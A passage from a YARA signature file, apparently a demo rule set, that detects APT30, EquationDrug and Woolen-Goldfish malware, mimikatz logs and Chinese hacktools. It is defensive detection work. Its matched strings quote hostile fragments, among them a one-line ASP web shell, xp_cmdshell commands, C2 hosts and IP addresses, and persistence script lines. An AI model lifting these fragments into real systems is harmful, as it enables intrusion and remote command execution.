      minimum_yara = "1.7"
      
   strings:
      $s0 = "Windows Security Service Feedback" fullword wide
      $s1 = "wssfmgr.exe" fullword wide
      $s2 = "\\rb.htm" fullword ascii
      $s3 = "rb.htm" fullword ascii
      $s4 = "cook5" ascii
      $s5 = "5, 4, 2600, 0" fullword wide
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
} 

rule APT30_Sample_27_RID2BE2 : APT DEMO FILE G0013 T1136 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:25:31"
      score = 95
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0013, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Mozilla/4.0" fullword ascii
      $s1 = "dizhi.gif" fullword ascii
      $s5 = "oftHaveAck+" ascii
      $s10 = "HlobalAl" fullword ascii
      $s13 = "$NtRND1$" fullword ascii
      $s14 = "_NStartup" fullword ascii
      $s16 = "GXSYSTEM" fullword ascii
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
} 

rule APT30_Sample_28_RID2BE3 : APT DEMO FILE G0013 T1136 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:25:41"
      score = 95
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0013, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "www.flyeagles.com" fullword ascii
      $s1 = "iexplore.exe" fullword ascii
      $s2 = "www.km-nyc.com" fullword ascii
      $s3 = "cmdLine.exe" fullword ascii
      $s4 = "Software\\Microsoft\\CurrentNetInf" fullword ascii
      $s5 = "/dizhi.gif" ascii
      $s6 = "/connect.gif" ascii
      $s7 = "USBTest.sys" fullword ascii
      $s8 = "/ver.htm" fullword ascii
      $s11 = "\\netscv.exe" fullword ascii
      $s12 = "/app.htm" fullword ascii
      $s13 = "\\netsvc.exe" fullword ascii
      $s14 = "/exe.htm" fullword ascii
      $s18 = "MicrosoftHaveAck" fullword ascii
      $s19 = "MicrosoftHaveExit" fullword ascii
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and 7 of them
} 

rule APT30_Sample_29_RID2BE4 : APT DEMO FILE G0013 T1136 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:25:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0013, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "LSSAS.exe" fullword ascii
      $s1 = "Software\\Microsoft\\FlashDiskInf" fullword ascii
      $s2 = ".petite" fullword ascii
      $s3 = "MicrosoftFlashExit" fullword ascii
      $s4 = "MicrosoftFlashHaveExit" fullword ascii
      $s5 = "MicrosoftFlashHaveAck" fullword ascii
      $s6 = "\\driver32" fullword ascii
      $s7 = "MicrosoftFlashZJ" fullword ascii
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
} 

rule APT30_Sample_30_RID2BDC : APT DEMO FILE G0013 T1136 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:24:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0013, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "5.1.2600.2180 (xpsp_sp2_rtm.040803-2158)" fullword wide
      $s3 = "RnhwtxtkyLRRMf{jJ}ny" fullword ascii
      $s4 = "RnhwtxtkyLRRJ}ny" fullword ascii
      $s5 = "ZRLDownloadToFileA" fullword ascii
      $s9 = "5.1.2600.2180" fullword wide
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
} 

rule APT30_Sample_31_RID2BDD : APT DEMO FILE G0013 T1136 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:24:41"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0013, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "\\ZJRsv.tem" fullword ascii
      $s1 = "forceguest" fullword ascii
      $s4 = "\\$NtUninstallKB570317$" fullword ascii
      $s8 = "[Can'tGetIP]" fullword ascii
      $s14 = "QWERTY:,`/" fullword ascii
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
} 

rule APT30_Generic_J_RID2C1E : APT DEMO FILE G0013 GEN T1136 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:35:31"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0013, GEN, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Launcher.EXE" fullword wide
      $s1 = "Symantec Security Technologies" fullword wide
      $s2 = "\\Symantec LiveUpdate.lnk" fullword ascii
      $s3 = "Symantec Service Framework" fullword wide
      $s4 = "\\ccSvcHst.exe" fullword ascii
      $s5 = "\\wssfmgr.exe" fullword ascii
      $s6 = "Symantec Corporation" fullword wide
      $s7 = "\\5.1.0.29" fullword ascii
      $s8 = "\\Engine" fullword ascii
      $s9 = "Copyright (C) 2000-2010 Symantec Corporation. All rights reserved." fullword wide
      $s10 = "Symantec LiveUpdate" fullword ascii
      $s11 = "\\Norton360" fullword ascii
      $s15 = "BinRes" fullword ascii
      $s16 = "\\readme.lz" fullword ascii
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
} 

rule APT30_Microfost_RID2C6E : APT DEMO FILE G0013 T1136 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:48:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0013, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Copyright (c) 2007 Microfost All Rights Reserved" fullword wide
      $s2 = "Microfost" fullword wide
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
} 

rule APT30_Generic_K_RID2C1F : APT DEMO FILE G0013 GEN T1136 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:35:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0013, GEN, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Maybe a Encrypted Flash" fullword ascii
      $s0 = "C:\\Program Files\\Common Files\\System\\wab32" fullword ascii
      $s1 = "\\TEMP\\" fullword ascii
      $s2 = "\\Temporary Internet Files\\" fullword ascii
      $s5 = "%s Size:%u Bytes" fullword ascii
      $s7 = "$.DATA$" fullword ascii
      $s10 = "? Size:%u By s" fullword ascii
      $s12 = "Maybe a Encrypted Flash" fullword ascii
      $s14 = "Name:%-32s" fullword ascii
      $s15 = "NickName:%-32s" fullword ascii
      $s19 = "Email:%-32s" fullword ascii
      $s21 = "C:\\Prog" ascii
      $s22 = "$LDDATA$" ascii
      $s31 = "Copy File %s OK!" fullword ascii
      $s32 = "%s Space:%uM,FreeSpace:%uM" fullword ascii
      $s34 = "open=%s" fullword ascii
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and ( all of ( $x* ) and 3 of ( $s* ) )
} 

rule APT30_Sample_33_RID2BDF : APT DEMO FILE G0013 T1136 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:25:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0013, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Version 4.7.3001" fullword wide
      $s1 = "msmsgr.exe" fullword wide
      $s2 = "MYUSER32.dll" fullword ascii
      $s3 = "MYADVAPI32.dll" fullword ascii
      $s4 = "CeleWare.NET1" fullword ascii
      $s6 = "MYMSVCRT.dll" fullword ascii
      $s7 = "Microsoft(R) is a registered trademark of Microsoft Corporation in the" wide
      $s8 = "WWW.CeleWare.NET1" ascii
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and 6 of them
} 

rule APT30_Sample_34_RID2BE0 : APT DEMO FILE G0013 T1136 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:25:11"
      score = 95
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0013, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "dizhi.gif" ascii
      $s1 = "eagles.vip.nse" ascii
      $s4 = "o%S:S0" ascii
      $s5 = "la/4.0" ascii
      $s6 = "s#!<4!2>s02==<'s1" ascii
      $s7 = "HlobalAl" ascii
      $s9 = "vcMicrosoftHaveAck7" ascii
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
} 

rule APT30_Sample_35_RID2BE1 : APT DEMO FILE G0013 T1136 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:25:21"
      score = 95
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0013, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "WhBoyIEXPLORE.EXE.exe" fullword ascii
      $s5 = "Startup>A" fullword ascii
      $s18 = "olhelp32Snapshot" fullword ascii
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
} 

rule APT30_Sample_1_RID2BAA : APT DEMO FILE G0013 T1136 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:16:11"
      score = 95
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0013, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "#hostid" fullword ascii
      $s1 = "\\Windows\\C" ascii
      $s5 = "TimUmove" fullword ascii
      $s6 = "Moziea/4.0 (c" fullword ascii
      $s7 = "StartupNA" fullword ascii
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
} 

rule APT30_Generic_1_RID2C05 : APT DEMO FILE G0013 GEN T1136 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:31:21"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0013, GEN, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "%s\\%s.txt" fullword
      $s1 = "\\ldsysinfo.txt" fullword
      $s4 = "(Extended Wansung)" fullword
      $s6 = "Computer Name:" fullword
      $s7 = "%s %uKB %04u-%02u-%02u %02u:%02u" fullword
      $s8 = "ASSAMESE" fullword
      $s9 = "BELARUSIAN" fullword
      $s10 = "(PR China)" fullword
      $s14 = "(French)" fullword
      $s15 = "AdvancedServer" fullword
      $s16 = "DataCenterServer" fullword
      $s18 = "(Finland)" fullword
      $s19 = "%s %04u-%02u-%02u %02u:%02u" fullword
      $s20 = "(Chile)" fullword
   condition: 
      filesize < 250KB and uint16 ( 0 ) == 0x5A4D and all of them
} 

rule APT30_Generic_2_RID2C06 : APT DEMO FILE G0013 GEN T1136 {
   meta:
      description = "FireEye APT30 Report Sample - from many files"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:31:31"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0013, GEN, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "%s\\%s\\KB985109.log" fullword
      $s1 = "%s\\%s\\KB989109.log" fullword
      $s2 = "Opera.exe" fullword wide
      $s3 = "%s:All online success on %u!" fullword
      $s4 = "%s:list online success on %u!" fullword
      $s5 = "%s:All online fail!" fullword
      $s6 = "Copyright Opera Software 1995-" fullword wide
      $s7 = "%s:list online fail!" fullword
      $s8 = "OnlineTmp.txt" fullword
      $s9 = "Opera Internet Browser" fullword wide
      $s12 = "Opera Software" fullword wide
      $s15 = "Check lan have done!!!" fullword
      $s16 = "List End." fullword
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
} 

rule APT30_Generic_3_RID2C07 : APT DEMO FILE G0013 GEN T1136 {
   meta:
      description = "FireEye APT30 Report Sample - from files 6e689351d94389ac6fdc341b859c7f6f, a813eba27b2166620bd75029cc1f04b0, b4ae0004094b37a40978ef06f311a75e"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:31:41"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0013, GEN, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Acrobat.exe" fullword wide
      $s14 = "********************************" fullword
      $s16 = "FFFF:>>>>>>>>>>>>>>>>>@" fullword
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
} 

rule APT30_Generic_4_RID2C08 : APT DEMO FILE G0013 GEN T1136 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:31:51"
      score = 85
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0013, GEN, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "del NetEagle_Scout.bat" fullword
      $s1 = "NetEagle_Scout.bat" fullword
      $s2 = "\\visit.exe" fullword
      $s3 = "\\System.exe" fullword
      $s4 = "\\System.dat" fullword
      $s5 = "\\ieupdate.exe" fullword
      $s6 = "GOTO ERROR" fullword
      $s7 = ":ERROR" fullword
      $s9 = "IF EXIST " fullword
      $s10 = "ioiocn" fullword
      $s11 = "SetFileAttribute" fullword
      $s12 = "le_0*^il" fullword
      $s13 = "le_.*^il" fullword
      $s14 = "le_-*^il" fullword
   condition: 
      filesize < 250KB and uint16 ( 0 ) == 0x5A4D and all of them
} 

rule APT30_Generic_5_RID2C09 : APT DEMO FILE G0013 GEN T1117 T1136 {
   meta:
      description = "FireEye APT30 Report Sample - from files 592381dfa14e61bce089cd00c9b118ae, b493ad490b691b8732983dcca8ea8b6f, b83d43e3b2f0b0a0e5cc047ef258c2cb"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:32:01"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0013, GEN, T1117, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "regsvr32 /s \"%ProgramFiles%\\Norton360\\Engine\\5.1.0.29\\ashelper.dll\"" fullword
      $s1 = "name=\"ftpserver.exe\"/>" fullword
      $s2 = "LiveUpdate.EXE" fullword wide
      $s3 = "<description>FTP Explorer</description>" fullword
      $s4 = "\\ashelper.dll" fullword
      $s5 = "LiveUpdate" fullword wide
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
} 

rule APT30_Generic_6_RID2C0A : APT DEMO FILE G0013 GEN T1136 {
   meta:
      description = "FireEye APT30 Report Sample - from files 168d207d0599ed0bb5bcfca3b3e7a9d3, 1e6ee89fddcf23132ee12802337add61, 5dd625af837e164dd2084b1f44a45808"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:32:11"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0013, GEN, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "GetStar" fullword
      $s1 = ".rdUaS" fullword
      $s2 = "%sOTwp/&A\\L" fullword
      $s3 = "a Encrt% Flash Disk" fullword
      $s4 = "ypeAutoRuChec" fullword
      $s5 = "NoDriveT" fullword
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
} 

rule APT30_Generic_7_RID2C0B : APT DEMO FILE G0013 GEN T1136 {
   meta:
      description = "FireEye APT30 Report Sample - from files 853a20f5fc6d16202828df132c41a061, 9c0cad1560cd0ffe2aa570621ef7d0a0, b590c15499448639c2748ff9e0d214b2"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:32:21"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0013, GEN, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Xjapor_*ata" fullword
      $s2 = "Xjapor_o*ata" fullword
      $s4 = "Ouopai" fullword
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
} 

rule APT30_Generic_8_RID2C0C : APT DEMO FILE G0013 GEN T1136 {
   meta:
      description = "FireEye APT30 Report Sample - from files 7c307ca84f922674049c0c43ca09bec1, b8617302180d331e197cc0433fc5023d, e6289e7f9f26be692cbe6f335a706014"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:32:31"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0013, GEN, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Windows NT4.0" fullword
      $s1 = "Windows NT3.51" fullword
      $s2 = "%d;%d;%d;%ld;%ld;%ld;" fullword
      $s3 = "%s %d.%d Build%d %s" fullword
      $s4 = "MSAFD Tcpip [TCP/IP]" fullword
      $s5 = "SQSRSS" fullword
      $s8 = "WM_COMP" fullword
      $s9 = "WM_MBU" fullword
      $s11 = "WM_GRID" fullword
      $s12 = "WM_RBU" fullword
   condition: 
      filesize < 250KB and uint16 ( 0 ) == 0x5A4D and all of them
} 

rule APT30_Generic_9_RID2C0D : APT DEMO FILE G0013 GEN T1136 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:32:41"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0013, GEN, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "%s\\%s\\$NtRecDoc$" fullword
      $s1 = "%s(%u)%s" fullword
      $s2 = "http://%s%s%s" fullword
      $s3 = "1.9.1.17" fullword wide
      $s4 = "(C)Firefox and Mozilla Developers, according to the MPL 1.1/GPL 2.0/LGPL" wide
   condition: 
      filesize < 250KB and uint16 ( 0 ) == 0x5A4D and all of them
} 

rule Mimikatz_Logfile_RID2D78 : DEMO HKTL S0002 T1003 T1075 T1097 T1136 T1178 {
   meta:
      description = "Detects a log file generated by malicious hack tool mimikatz"
      author = "Florian Roth"
      reference = "-"
      date = "2015-03-31 10:33:11"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      type = "file"
      tags = "DEMO, HKTL, S0002, T1003, T1075, T1097, T1136, T1178"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "SID               :" ascii fullword
      $s2 = "* NTLM     :" ascii fullword
      $s3 = "Authentication Id :" ascii fullword
      $s4 = "wdigest :" ascii fullword
   condition: 
      all of them
} 

rule CN_Toolset_sig_1433_135_sqlr_RID30D0 : CHINA DEMO HKTL T1136 {
   meta:
      description = "Detects a Chinese hacktool from a disclosed toolset - file sqlr.exe"
      author = "Florian Roth"
      reference = "http://qiannao.com/ls/905300366/33834c0c/"
      date = "2015-03-30 12:55:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Connect to %s MSSQL server success. Type Command at Prompt." fullword ascii
      $s11 = ";DATABASE=master" fullword ascii
      $s12 = "xp_cmdshell '" fullword ascii
      $s14 = "SELECT * FROM OPENROWSET('SQLOLEDB','Trusted_Connection=Yes;Data Source=myserver" ascii
   condition: 
      all of them
} 

rule WoolenGoldfish_Sample_1_RID3006 : APT DEMO T1136 {
   meta:
      description = "Detects a operation Woolen-Goldfish sample - http://goo.gl/NpJpVZ"
      author = "Florian Roth"
      reference = "http://goo.gl/NpJpVZ"
      date = "2015-03-25 12:22:11"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Cannot execute (%d)" fullword ascii
      $s16 = "SvcName" fullword ascii
   condition: 
      all of them
} 

rule WoolenGoldfish_Generic_2_RID3062 : APT DEMO GEN T1136 {
   meta:
      description = "Detects a operation Woolen-Goldfish sample - http://goo.gl/NpJpVZ"
      author = "Florian Roth"
      reference = "http://goo.gl/NpJpVZ"
      date = "2015-03-25 12:37:31"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, GEN, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "modules\\exploits\\littletools\\agent_wrapper\\release" ascii
   condition: 
      all of them
} 

rule WoolenGoldfish_Generic_1_RID3061 : APT DEMO GEN T1136 {
   meta:
      description = "Detects a operation Woolen-Goldfish sample - http://goo.gl/NpJpVZ"
      author = "Florian Roth"
      reference = "http://goo.gl/NpJpVZ"
      date = "2015-03-25 12:37:21"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, GEN, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x0 = "Users\\Wool3n.H4t\\" 
      $x1 = "C-CPP\\CWoolger" 
      $x2 = "NTSuser.exe" fullword wide
      $s1 = "107.6.181.116" fullword wide
      $s2 = "oShellLink.Hotkey = \"CTRL+SHIFT+F\"" fullword
      $s3 = "set WshShell = WScript.CreateObject(\"WScript.Shell\")" fullword
      $s4 = "oShellLink.IconLocation = \"notepad.exe, 0\"" fullword
      $s5 = "set oShellLink = WshShell.CreateShortcut(strSTUP & \"\\WinDefender.lnk\")" fullword
      $s6 = "wlg.dat" fullword
      $s7 = "woolger" fullword wide
      $s8 = "[Enter]" fullword
      $s9 = "[Control]" fullword
   condition: 
      ( 1 of ( $x* ) and 2 of ( $s* ) ) or ( 6 of ( $s* ) )
} 

rule Webshell_CN_Hacktools_tools_asp_RID3371 : CHINA DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Chinese Hacktool Archive - file asp.asp"
      author = "Florian Roth"
      reference = "xfocus.net"
      date = "2015-03-22 14:48:01"
      score = 55
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<SCRIPT RUNAT=SERVER LANGUAGE=JAVASCRIPT>eval(Request.form('#')+'')</SCRIPT>" fullword ascii
   condition: 
      all of them
} 

rule EquationDrug_HDDSSD_Op_RID2F20 : APT DEMO T1136 {
   meta:
      description = "EquationDrug - HDD/SSD firmware operation - nls_933w.dll"
      author = "Florian Roth"
      reference = "http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/"
      date = "2015-03-11 11:43:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "nls_933w.dll" fullword ascii
   condition: 
      all of them
} 

rule EquationDrug_NetworkSniffer1_RID3230 : APT DEMO T1040 T1136 {
   meta:
      description = "EquationDrug - Backdoor driven by network sniffer - mstcp32.sys, fat32.sys"
      author = "Florian Roth"
      reference = "http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/"
      date = "2015-03-11 13:54:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1040, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Microsoft(R) Windows (TM) Operating System" fullword wide
      $s1 = "\\Registry\\User\\CurrentUser\\" fullword wide
      $s3 = "sys\\mstcp32.dbg" fullword ascii
      $s7 = "mstcp32.sys" fullword wide
      $s8 = "p32.sys" fullword ascii
      $s9 = "\\Device\\%ws_%ws" fullword wide
      $s10 = "\\DosDevices\\%ws" fullword wide
      $s11 = "\\Device\\%ws" fullword wide
   condition: 
      all of them
} 

rule EquationDrug_NetworkSniffer2_RID3231 : APT DEMO T1040 T1136 {
   meta:
      description = "EquationDrug - Network Sniffer - tdip.sys"
      author = "Florian Roth"
      reference = "http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/"
      date = "2015-03-11 13:54:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1040, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Microsoft(R) Windows (TM) Operating System" fullword wide
      $s1 = "IP Transport Driver" fullword wide
      $s2 = "tdip.sys" fullword wide
      $s3 = "sys\\tdip.dbg" fullword ascii
      $s4 = "dip.sys" fullword ascii
      $s5 = "\\Device\\%ws_%ws" fullword wide
      $s6 = "\\DosDevices\\%ws" fullword wide
      $s7 = "\\Device\\%ws" fullword wide
   condition: 
      all of them
} 

rule EquationDrug_NetworkSniffer3_RID3232 : APT DEMO T1040 T1136 {
   meta:
      description = "EquationDrug - Network Sniffer - tdip.sys"
      author = "Florian Roth"
      reference = "http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/"
      date = "2015-03-11 13:54:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1040, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Corporation. All rights reserved." fullword wide
      $s1 = "IP Transport Driver" fullword wide
      $s2 = "tdip.sys" fullword wide
      $s3 = "tdip.pdb" fullword ascii
   condition: 
      all of them
} 

rule EquationDrug_VolRec_Driver_RID315E : APT DEMO T1136 {
   meta:
      description = "EquationDrug - Collector plugin for Volrec - msrstd.sys"
      author = "Florian Roth"
      reference = "http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/"
      date = "2015-03-11 13:19:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "msrstd.sys" fullword wide
      $s1 = "msrstd.pdb" fullword ascii
      $s2 = "msrstd driver" fullword wide
   condition: 
      all of them
} 

rule EquationDrug_KernelRootkit_RID3195 : APT DEMO T1014 T1050 T1136 {
   meta:
      description = "EquationDrug - Kernel mode stage 0 and rootkit (Windows 2000 and above) - msndsrv.sys"
      author = "Florian Roth"
      reference = "http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/"
      date = "2015-03-11 13:28:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1014, T1050, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Microsoft(R) Windows (TM) Operating System" fullword wide
      $s1 = "Parmsndsrv.dbg" fullword ascii
      $s2 = "\\Registry\\User\\CurrentUser\\" fullword wide
      $s3 = "msndsrv.sys" fullword wide
      $s5 = "\\REGISTRY\\MACHINE\\System\\CurrentControlSet\\Control\\Windows" fullword wide
      $s6 = "\\Device\\%ws_%ws" fullword wide
      $s7 = "\\DosDevices\\%ws" fullword wide
      $s9 = "\\Device\\%ws" fullword wide
   condition: 
      all of them
} 

